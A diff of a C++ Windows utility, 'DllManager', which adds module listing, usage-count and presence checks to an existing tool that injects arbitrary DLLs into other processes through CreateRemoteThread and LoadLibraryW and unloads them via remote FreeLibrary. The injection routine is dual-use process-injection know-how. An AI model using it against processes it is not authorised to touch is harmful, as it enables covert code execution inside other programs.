@@ -1,12 +1,17 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <tlhelp32.h>
 #include <string>
 #include <vector>
 #include <iostream>
+#include <iomanip>  // for std::setw
+#include <sstream>
 
 #pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Version.lib")
 
+//---------------------------------------------
 // Print help information
+//---------------------------------------------
 void PrintHelp()
 {
     std::wcout << L"Usage:\n"
@@ -21,13 +26,27 @@ void PrintHelp()
         << L"  Unload DLL:\n"
         << L"    DllManager.exe unload --pid <PID> --dll <DLLFileNameOrFullPath>\n"
         << L"    DllManager.exe unload --pname <ProcessName> --dll <DLLFileNameOrFullPath>\n\n"
+        << L"  Query DLL usage count:\n"
+        << L"    DllManager.exe query --pid <PID> --dll <DLLFileNameOrFullPath>\n"
+        << L"    DllManager.exe query --pname <ProcessName> --dll <DLLFileNameOrFullPath>\n\n"
+        << L"  List all DLLs:\n"
+        << L"    DllManager.exe list --pid <PID>\n"
+        << L"    DllManager.exe list --pname <ProcessName>\n\n"
+        << L"  Check if a specific DLL is loaded in a process:\n"
+        << L"    DllManager.exe check --pid <PID> --dll <DLLFileNameOrFullPath>\n"
+        << L"    DllManager.exe check --pname <ProcessName> --dll <DLLFileNameOrFullPath>\n\n"
         << L"Examples:\n"
         << L"  DllManager.exe inject --pid 1234 --dll C:\\Test\\MyDll.dll\n"
         << L"  DllManager.exe unload --pname notepad.exe --dll MyDll.dll\n"
+        << L"  DllManager.exe query --pid 1234 --dll MyDll.dll\n"
+        << L"  DllManager.exe list --pid 1234\n"
+        << L"  DllManager.exe check --pname notepad.exe --dll user32.dll\n"
         << std::endl;
 }
 
+//---------------------------------------------
 // Convert a std::wstring to lowercase
+//---------------------------------------------
 std::wstring ToLower(const std::wstring& str)
 {
     std::wstring result = str;
@@ -36,8 +55,10 @@ std::wstring ToLower(const std::wstring& str)
     return result;
 }
 
+//---------------------------------------------
 // Get PID by process name (if multiple processes share the same name, 
 // this example only returns the first match)
+//---------------------------------------------
 DWORD GetProcessIDByName(const std::wstring& processName)
 {
     DWORD pid = 0;
@@ -67,18 +88,190 @@ DWORD GetProcessIDByName(const std::wstring& processName)
     return pid;
 }
 
-// Inject DLL
-bool InjectDLL(DWORD pid, const std::wstring& dllPath)
+//---------------------------------------------
+// A small helper to parse version info from file
+//---------------------------------------------
+bool GetFileVersionInfoStr(const std::wstring& filePath,
+    std::wstring& outCompany,
+    std::wstring& outDescription,
+    std::wstring& outVersion)
 {
-    // Open the target process
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess)
+    outCompany.clear();
+    outDescription.clear();
+    outVersion.clear();
+
+    DWORD dummyHandle = 0;
+    DWORD size = GetFileVersionInfoSizeW(filePath.c_str(), &dummyHandle);
+    if (size == 0)
     {
-        std::wcerr << L"[-] Unable to open process PID=" << pid << L", Error: " << GetLastError() << std::endl;
+        // possibly no version resource
         return false;
     }
 
-    // Allocate memory in the target process
+    std::vector<BYTE> data(size);
+    if (!GetFileVersionInfoW(filePath.c_str(), 0, size, data.data()))
+    {
+        return false;
+    }
+
+    // Typically use the "040904b0" (U.S. English + Unicode) block, 
+    // but we can do a more robust approach enumerating languages if needed.
+    struct LANGANDCODEPAGE {
+        WORD wLanguage;
+        WORD wCodePage;
+    } *pLangInfo = NULL;
+    UINT cbLang = 0;
+
+    // Query a list of language-codepage pairs
+    if (!VerQueryValueW(data.data(), L"\\VarFileInfo\\Translation", (LPVOID*)&pLangInfo, &cbLang))
+    {
+        // fallback: try the default en-US codepage = 040904b0
+        pLangInfo = NULL;
+    }
+
+    // We make a small helper lambda to read a specific string
+    auto queryStringValue = [&](const wchar_t* name, std::wstring& outVal)
+        {
+            outVal.clear();
+            if (!pLangInfo || cbLang < sizeof(LANGANDCODEPAGE))
+            {
+                // Use fixed "040904b0"
+                std::wstringstream ss;
+                ss << L"\\StringFileInfo\\040904b0\\" << name;
+                LPWSTR pBuf = NULL;
+                UINT bufLen = 0;
+                if (VerQueryValueW(data.data(), ss.str().c_str(), (LPVOID*)&pBuf, &bufLen) && pBuf)
+                {
+                    outVal.assign(pBuf, bufLen);
+                }
+            }
+            else
+            {
+                // Use first language from the translation table
+                LANGANDCODEPAGE lang = pLangInfo[0];
+                wchar_t subBlock[50];
+                swprintf_s(subBlock, L"\\StringFileInfo\\%04x%04x\\%s",
+                    lang.wLanguage, lang.wCodePage, name);
+
+                LPWSTR pBuf = NULL;
+                UINT bufLen = 0;
+                if (VerQueryValueW(data.data(), subBlock, (LPVOID*)&pBuf, &bufLen) && pBuf)
+                {
+                    outVal.assign(pBuf, bufLen);
+                }
+            }
+        };
+
+    // Query CompanyName
+    queryStringValue(L"CompanyName", outCompany);
+
+    // Query FileDescription
+    queryStringValue(L"FileDescription", outDescription);
+
+    // Query FileVersion or ProductVersion
+    {
+        std::wstring fileVer;
+        queryStringValue(L"FileVersion", fileVer);
+
+        std::wstring productVer;
+        queryStringValue(L"ProductVersion", productVer);
+
+        // 选一个非空的
+        if (!fileVer.empty())
+            outVersion = fileVer;
+        else
+            outVersion = productVer;
+    }
+
+    return true;
+}
+
+//---------------------------------------------
+// Return the name or path matching
+//---------------------------------------------
+bool MatchModuleNameOrPath(const std::wstring& userInput, const std::wstring& modulePath)
+{
+    std::wstring userLower = ToLower(userInput);
+    std::wstring modLower = ToLower(modulePath);
+
+    // If userInput has path separators, do full path compare
+    if (userLower.find(L'\\') != std::wstring::npos ||
+        userLower.find(L'/') != std::wstring::npos ||
+        userLower.find(L':') != std::wstring::npos)
+    {
+        return (userLower == modLower);
+    }
+    else
+    {
+        // Compare only the filename portion
+        size_t pos = modLower.find_last_of(L'\\');
+        if (pos == std::wstring::npos)
+        {
+            // No backslash in module path
+            return (userLower == modLower);
+        }
+        else
+        {
+            std::wstring fileName = modLower.substr(pos + 1);
+            return (userLower == fileName);
+        }
+    }
+}
+
+//---------------------------------------------
+// Find the module base address in the target process that matches userDllString
+//---------------------------------------------
+HMODULE FindRemoteModule(DWORD pid, const std::wstring& userDllString)
+{
+    HMODULE hResult = NULL;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+        return NULL;
+    }
+
+    MODULEENTRY32W me32 = { 0 };
+    me32.dwSize = sizeof(me32);
+
+    if (Module32FirstW(hSnapshot, &me32))
+    {
+        do
+        {
+            if (MatchModuleNameOrPath(userDllString, me32.szExePath))
+            {
+                hResult = me32.hModule;
+                break;
+            }
+        } while (Module32NextW(hSnapshot, &me32));
+    }
+
+    CloseHandle(hSnapshot);
+    return hResult;
+}
+
+//---------------------------------------------
+// Check if a DLL exists in the target process
+//---------------------------------------------
+bool CheckDllExists(DWORD pid, const std::wstring& dllIdentifier)
+{
+    // If we can find a module handle, it "exists"
+    HMODULE hm = FindRemoteModule(pid, dllIdentifier);
+    return (hm != NULL);
+}
+
+//---------------------------------------------
+// Inject DLL
+//---------------------------------------------
+bool InjectDLL(DWORD pid, const std::wstring& dllPath)
+{
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess)
+    {
+        std::wcerr << L"[-] Unable to open process PID=" << pid
+            << L", Error: " << GetLastError() << std::endl;
+        return false;
+    }
+
     size_t allocSize = (dllPath.size() + 1) * sizeof(wchar_t);
     LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, allocSize, MEM_COMMIT, PAGE_READWRITE);
     if (!pRemoteBuf)
@@ -88,7 +281,6 @@ bool InjectDLL(DWORD pid, const std::wstring& dllPath)
         return false;
     }
 
-    // Write the DLL path into the allocated memory
     if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath.c_str(), allocSize, NULL))
     {
         std::wcerr << L"[-] WriteProcessMemory failed, Error: " << GetLastError() << std::endl;
@@ -97,7 +289,6 @@ bool InjectDLL(DWORD pid, const std::wstring& dllPath)
         return false;
     }
 
-    // Get the address of LoadLibraryW
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
     if (!hKernel32)
     {
@@ -116,7 +307,6 @@ bool InjectDLL(DWORD pid, const std::wstring& dllPath)
         return false;
     }
 
-    // Create a remote thread to call LoadLibraryW
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
         (LPTHREAD_START_ROUTINE)pLoadLibraryW, pRemoteBuf, 0, NULL);
     if (!hThread)
@@ -127,95 +317,40 @@ bool InjectDLL(DWORD pid, const std::wstring& dllPath)
         return false;
     }
 
-    // Wait for the remote thread to finish
     WaitForSingleObject(hThread, INFINITE);
 
-    // Cleanup
     CloseHandle(hThread);
     VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
     CloseHandle(hProcess);
 
-    std::wcout << L"[+] Successfully injected DLL: " << dllPath << std::endl;
-    return true;
-}
-
-// Utility function: check if the user-provided DLL name matches the enumerated module
-bool MatchModuleNameOrPath(const std::wstring& userInput, const std::wstring& modulePath)
-{
-    std::wstring userLower = ToLower(userInput);
-    std::wstring modLower = ToLower(modulePath);
-
-    // Check if it contains directory symbols: '\\', '/', ':'
-    if (userLower.find(L'\\') != std::wstring::npos ||
-        userLower.find(L'/') != std::wstring::npos ||
-        userLower.find(L':') != std::wstring::npos)
+    std::wcout << L"[+] Injection attempt finished, checking result..." << std::endl;
+    // Re-check if injection is successful
+    if (CheckDllExists(pid, dllPath))
     {
-        // If the user provided a full path (or includes path symbols), 
-        // require an exact match
-        return (userLower == modLower);
+        std::wcout << L"[+] Successfully injected DLL: " << dllPath << std::endl;
+        return true;
     }
     else
     {
-        // The user provided only a filename
-        // Find the position of the last backslash in modulePath
-        size_t pos = modLower.find_last_of(L'\\');
-        if (pos == std::wstring::npos)
-        {
-            // No backslash found; compare directly
-            return (userLower == modLower);
-        }
-        else
-        {
-            // Extract the filename part
-            std::wstring fileName = modLower.substr(pos + 1);
-            return (userLower == fileName);
-        }
+        std::wcerr << L"[-] Injection might have failed: " << dllPath << L" not found in target process." << std::endl;
+        return false;
     }
 }
 
-// Find the module base address in the target process that matches userDllString
-HMODULE FindRemoteModule(DWORD pid, const std::wstring& userDllString)
-{
-    HMODULE hResult = NULL;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
-    if (hSnapshot == INVALID_HANDLE_VALUE)
-    {
-        std::wcerr << L"[-] CreateToolhelp32Snapshot failed, Error code: " << GetLastError() << std::endl;
-        return NULL;
-    }
-
-    MODULEENTRY32W me32 = { 0 };
-    me32.dwSize = sizeof(me32);
-
-    if (Module32FirstW(hSnapshot, &me32))
-    {
-        do
-        {
-            // me32.szExePath is the full path of the module
-            if (MatchModuleNameOrPath(userDllString, me32.szExePath))
-            {
-                hResult = me32.hModule;
-                break;
-            }
-        } while (Module32NextW(hSnapshot, &me32));
-    }
-
-    CloseHandle(hSnapshot);
-    return hResult;
-}
-
+//---------------------------------------------
 // Unload a DLL
+//---------------------------------------------
 bool UnloadDLL(DWORD pid, const std::wstring& dllIdentifier)
 {
-    // Open the target process
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess)
     {
-        std::wcerr << L"[-] Unable to open process PID=" << pid << L", Error: " << GetLastError() << std::endl;
+        std::wcerr << L"[-] Unable to open process PID=" << pid
+            << L", Error: " << GetLastError() << std::endl;
         return false;
     }
 
-    // Find the remote module
+    // find module
     HMODULE hModuleToUnload = FindRemoteModule(pid, dllIdentifier);
     if (!hModuleToUnload)
     {
@@ -224,7 +359,6 @@ bool UnloadDLL(DWORD pid, const std::wstring& dllIdentifier)
         return false;
     }
 
-    // Get the address of FreeLibrary
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
     if (!hKernel32)
     {
@@ -241,7 +375,6 @@ bool UnloadDLL(DWORD pid, const std::wstring& dllIdentifier)
         return false;
     }
 
-    // Create a remote thread to call FreeLibrary
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
         (LPTHREAD_START_ROUTINE)pFreeLibrary, (LPVOID)hModuleToUnload, 0, NULL);
     if (!hThread)
@@ -251,17 +384,190 @@ bool UnloadDLL(DWORD pid, const std::wstring& dllIdentifier)
         return false;
     }
 
-    // Wait for the thread to complete
     WaitForSingleObject(hThread, INFINITE);
 
     CloseHandle(hThread);
     CloseHandle(hProcess);
 
-    std::wcout << L"[+] Successfully unloaded DLL: " << dllIdentifier << std::endl;
+    // Re-check if unload is successful
+    if (!CheckDllExists(pid, dllIdentifier))
+    {
+        std::wcout << L"[+] Successfully unloaded DLL: " << dllIdentifier << std::endl;
+        return true;
+    }
+    else
+    {
+        std::wcerr << L"[-] DLL still exists after unload attempt: " << dllIdentifier << std::endl;
+        return false;
+    }
+}
+
+//---------------------------------------------
+// Query the usage count of a DLL in a given process
+//---------------------------------------------
+bool QueryDllUsageCount(DWORD pid, const std::wstring& dllIdentifier)
+{
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+        std::wcerr << L"[-] CreateToolhelp32Snapshot failed, Error code: "
+            << GetLastError() << std::endl;
+        return false;
+    }
+
+    MODULEENTRY32W me32 = { 0 };
+    me32.dwSize = sizeof(me32);
+
+    bool found = false;
+
+    if (Module32FirstW(hSnapshot, &me32))
+    {
+        do
+        {
+            if (MatchModuleNameOrPath(dllIdentifier, me32.szExePath))
+            {
+                found = true;
+                std::wcout << L"[+] DLL found: " << me32.szExePath << std::endl;
+                std::wcout << L"    -> ProccntUsage: " << me32.ProccntUsage << std::endl;
+                std::wcout << L"    -> GlblcntUsage: " << me32.GlblcntUsage << std::endl;
+                break;
+            }
+        } while (Module32NextW(hSnapshot, &me32));
+    }
+
+    CloseHandle(hSnapshot);
+
+    if (!found)
+    {
+        std::wcerr << L"[-] Could not find the specified DLL in the process: " << dllIdentifier << std::endl;
+        return false;
+    }
+
     return true;
 }
 
+//---------------------------------------------
+// List all DLLs in the target process, 
+// with extended info: Name, Address, Size, Path, 
+// Description, Company, Version
+//---------------------------------------------
+bool ListAllDlls(DWORD pid)
+{
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+        std::wcerr << L"[-] CreateToolhelp32Snapshot failed, Error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    MODULEENTRY32W me32 = { 0 };
+    me32.dwSize = sizeof(me32);
+
+    std::vector<MODULEENTRY32W> modules;
+
+    if (Module32FirstW(hSnapshot, &me32))
+    {
+        do
+        {
+            modules.push_back(me32);
+        } while (Module32NextW(hSnapshot, &me32));
+    }
+    CloseHandle(hSnapshot);
+
+    // We prepare a struct to hold final info
+    struct DllInfo
+    {
+        std::wstring moduleName;
+        std::wstring baseAddress;
+        std::wstring size;
+        std::wstring path;
+        std::wstring description;
+        std::wstring company;
+        std::wstring version;
+    };
+
+    std::vector<DllInfo> infoList;
+    infoList.reserve(modules.size());
+
+    for (auto& m : modules)
+    {
+        DllInfo di;
+        di.moduleName = m.szModule;
+
+        // Address & size as hex + decimal
+        {
+            std::wstringstream ssBase;
+            ssBase << L"0x" << std::hex << (DWORD_PTR)m.modBaseAddr;
+            di.baseAddress = ssBase.str();
+        }
+        {
+            std::wstringstream ssSize;
+            ssSize << m.modBaseSize << L" (0x" << std::hex << m.modBaseSize << L")";
+            di.size = ssSize.str();
+        }
+
+        di.path = m.szExePath;
+
+        // Description, Company, Version from resource
+        std::wstring desc, comp, vers;
+        if (GetFileVersionInfoStr(m.szExePath, comp, desc, vers))
+        {
+            di.description = desc;
+            di.company = comp;
+            di.version = vers;
+        }
+        else
+        {
+            di.description = L"";
+            di.company = L"";
+            di.version = L"";
+        }
+
+        infoList.push_back(di);
+    }
+
+    printf_s("[+] Total modules found: %zu\n", infoList.size());
+
+    // Print as a table
+    // We'll do a basic approach with setw
+    const int colWidth1 = 20;  // moduleName
+    const int colWidth2 = 12;  // baseAddress
+    const int colWidth3 = 16;  // size
+    const int colWidth4 = 40;  // path
+    const int colWidth5 = 20;  // description
+    const int colWidth6 = 20;  // company
+    const int colWidth7 = 16;  // version
+
+    std::wcout << std::left
+        << std::setw(colWidth1) << L"ModuleName"
+        << std::setw(colWidth2) << L"Address"
+        << std::setw(colWidth3) << L"Size"
+        << std::setw(colWidth4) << L"Path"
+        << std::setw(colWidth5) << L"Description"
+        << std::setw(colWidth6) << L"Company"
+        << std::setw(colWidth7) << L"Version"
+        << std::endl;
+
+    std::wcout << std::wstring(150, L'-') << std::endl;
+
+    for (auto& di : infoList)
+    {
+        printf_s("%ls | %ls | %ls | %ls | %ls | %ls | %ls\n",
+            di.moduleName.c_str(),
+            di.baseAddress.c_str(),
+            di.size.c_str(),
+            di.path.c_str(),
+            di.description.c_str(),
+            di.company.c_str(),
+            di.version.c_str());
+    }
+
+    return true;
+}
+
+//---------------------------------------------
 // Command line parsing
+//---------------------------------------------
 int wmain(int argc, wchar_t* argv[])
 {
     // If there are not enough arguments, print help
@@ -289,9 +595,13 @@ int wmain(int argc, wchar_t* argv[])
         }
     }
 
-    // The first argument (action) => inject or unload
+    // The first argument => inject, unload, query, list, check
     std::wstring action = ToLower(args[0]);
-    if (action != L"inject" && action != L"unload")
+    if (action != L"inject" &&
+        action != L"unload" &&
+        action != L"query" &&
+        action != L"list" &&
+        action != L"check")
     {
         std::wcerr << L"[-] Unknown action: " << args[0] << std::endl;
         PrintHelp();
@@ -311,7 +621,6 @@ int wmain(int argc, wchar_t* argv[])
 
         if (par == L"--pid")
         {
-            // Next argument is PID
             if (i + 1 < args.size())
             {
                 pid = std::wcstoul(args[i + 1].c_str(), nullptr, 10);
@@ -326,7 +635,6 @@ int wmain(int argc, wchar_t* argv[])
         }
         else if (par == L"--pname")
         {
-            // Next argument is process name
             if (i + 1 < args.size())
             {
                 pname = args[i + 1];
@@ -340,7 +648,6 @@ int wmain(int argc, wchar_t* argv[])
         }
         else if (par == L"--dll")
         {
-            // Next argument is the DLL path or file name
             if (i + 1 < args.size())
             {
                 dllPathOrName = args[i + 1];
@@ -354,23 +661,21 @@ int wmain(int argc, wchar_t* argv[])
         }
         else
         {
-            // Other unrecognized parameters; may not be an error, depending on needs
+            // Other unrecognized parameters
             std::wcerr << L"[!] Unrecognized parameter: " << args[i] << std::endl;
         }
     }
 
-    // Check necessary parameters
+    // If we need a PID but not provided, check pname
     if (!usePid && pname.empty())
     {
-        std::wcerr << L"[-] You must specify --pid <pid> or --pname <processName>" << std::endl;
-        PrintHelp();
-        return -1;
-    }
-    if (dllPathOrName.empty())
-    {
-        std::wcerr << L"[-] You must specify --dll <PathOrFileName>" << std::endl;
-        PrintHelp();
-        return -1;
+        if (action != L"list")
+        {
+            // list 可以只使用 --pid 或 --pname ，两者必须有其一
+            std::wcerr << L"[-] You must specify --pid <pid> or --pname <processName>" << std::endl;
+            PrintHelp();
+            return -1;
+        }
     }
 
     // If pname was provided, convert it to PID
@@ -387,13 +692,57 @@ int wmain(int argc, wchar_t* argv[])
 
     // Execute based on the action
     bool result = false;
+
     if (action == L"inject")
     {
+        if (dllPathOrName.empty())
+        {
+            std::wcerr << L"[-] You must specify --dll <PathToDLL> for injection" << std::endl;
+            return -1;
+        }
         result = InjectDLL(pid, dllPathOrName);
     }
-    else // unload
+    else if (action == L"unload")
     {
+        if (dllPathOrName.empty())
+        {
+            std::wcerr << L"[-] You must specify --dll <DLLFileNameOrFullPath> for unload" << std::endl;
+            return -1;
+        }
         result = UnloadDLL(pid, dllPathOrName);
+    }
+    else if (action == L"query")
+    {
+        if (dllPathOrName.empty())
+        {
+            std::wcerr << L"[-] You must specify --dll <DLLFileNameOrFullPath> for query" << std::endl;
+            return -1;
+        }
+        result = QueryDllUsageCount(pid, dllPathOrName);
+    }
+    else if (action == L"list")
+    {
+        // List all DLLs in the process
+        result = ListAllDlls(pid);
+    }
+    else if (action == L"check")
+    {
+        if (dllPathOrName.empty())
+        {
+            std::wcerr << L"[-] You must specify --dll <DLLFileNameOrFullPath> for check" << std::endl;
+            return -1;
+        }
+        bool exists = CheckDllExists(pid, dllPathOrName);
+        if (exists)
+        {
+            std::wcout << L"[+] The DLL [" << dllPathOrName << L"] is loaded in PID=" << pid << std::endl;
+            result = true;
+        }
+        else
+        {
+            std::wcerr << L"[-] The DLL [" << dllPathOrName << L"] is NOT loaded in PID=" << pid << std::endl;
+            result = false;
+        }
     }
 
     return result ? 0 : -1;
